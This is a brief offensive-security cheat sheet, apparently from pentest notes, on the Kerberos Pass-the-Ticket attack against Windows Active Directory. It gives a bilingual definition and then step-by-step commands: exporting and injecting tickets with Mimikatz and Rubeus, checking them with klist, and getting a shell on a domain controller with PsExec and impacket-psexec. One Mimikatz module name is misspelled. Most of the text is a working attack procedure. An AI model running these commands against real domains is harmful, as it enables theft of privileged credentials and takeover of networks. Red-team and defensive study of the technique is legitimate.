# Pass-The-Ticket

## What is this RU
**Pass-the-Ticket (PTT)** - это метод атаки на безопасность системы аутентификации Kerberos, используемой в Windows Active Directory. Этот метод основывается на использовании украденного Kerberos TGT (Ticket-Granting Ticket), который представляет собой временный токен, выдаваемый пользователю при успешной аутентификации в системе.

## What is this EN 
**Pass-the-Ticket (PTT)** - is a method of attacking the security of the Kerberos authentication system used in Windows Active Directory. This method is based on the use of a stolen Kerberos TGT (Ticket-Granting Ticket), which is a temporary token given to a user when he successfully authenticates to the system.

## Pass the ticket explotation

Mimikatz
```
serkurlsa::tickets /export
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-administrator@krbtgt-domain.local.kirbi"
```

Rubeus
```
Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-administrator@krbtgt-domain.local.kirbi /user:username
```

To check kerberos tickets
```
klist
```

Execute Psexec
```
.\PsExec.exe -accepteula \\dc01.domain.local cmd
```

## Explotation on Linux 

Converting kirbi to ccache 
```
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
```

Add ticket 
```
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK 
```

Using psexec
```
sudo impacket-psexec domain.local/administrator@dc01.domain.local -k -no-pass
```
